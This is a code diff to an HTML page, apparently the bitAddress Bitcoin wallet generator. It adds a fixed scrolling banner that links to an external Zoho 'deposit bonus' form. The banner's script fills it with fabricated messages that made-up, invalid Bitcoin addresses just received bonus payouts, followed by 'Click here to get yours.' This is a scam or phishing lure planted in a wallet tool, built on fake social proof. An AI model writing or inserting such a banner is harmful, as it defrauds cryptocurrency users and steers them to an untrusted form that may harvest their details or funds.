@@ -594,5 +594,57 @@ s0.parentNode.insertBefore(s1,s0);
     }, 1500);
   });
 </script>
+<div id="chyron" onclick="window.location.href='https://forms.zohopublic.com/bitaddress1/form/bitAddressDepositBonusForm/formperma/F-Y6NKaMygDIpaRYyx9bgRmh5hphF9WokO52RfIUY2A';">
+  <div id="chyron-text"></div>
+</div>
+
+<style>
+  #chyron {
+    position: fixed;
+    bottom: 0;
+    width: 100%;
+    background-color: green;
+    color: yellow;
+    font-weight: bold;
+    font-size: 18px;
+    overflow: hidden;
+    height: 40px;
+    display: flex;
+    align-items: center;
+    cursor: pointer;
+    z-index: 9999;
+  }
+
+  #chyron-text {
+    white-space: nowrap;
+    display: inline-block;
+    animation: scroll-left 20s linear infinite;
+    padding-left: 100%;
+  }
+
+  @keyframes scroll-left {
+    0% {
+      transform: translateX(0%);
+    }
+    100% {
+      transform: translateX(-100%);
+    }
+  }
+</style>
+
+<script>
+  const wallets = [
+    { address: "bc1iwptp0021cze5wx8g80bzyogyc1oxocvzoqjp3h", amount: "$9,921.23" },
+    { address: "bc1xnpm2h3gnjuc1yvnwp03v9d7ebljrxilajvvzxs", amount: "$619.42" },
+    { address: "bc19yzpaweu2sqjg4w65mswzm3i0u57mrbkfcrj3o5", amount: "$3,143.13" },
+    { address: "bc1boccx0e5qwcsgcq86cu36kr767juqgrn1rzq617", amount: "$1,568.90" },
+    { address: "bc1te4lx22z05mtgsfth2zgmaw00sukcdfzwivl9sj", amount: "$5,687.20" },
+    // ... add the remaining 295 entries here
+  ];
+
+  const messages = wallets.map(w => `${w.address} has just received ${w.amount} worth of Bitcoin as deposit bonus. Click here to get yours.`);
+
+  document.getElementById("chyron-text").textContent = messages.join("     •     ");
+</script>
 </body>
 </html>
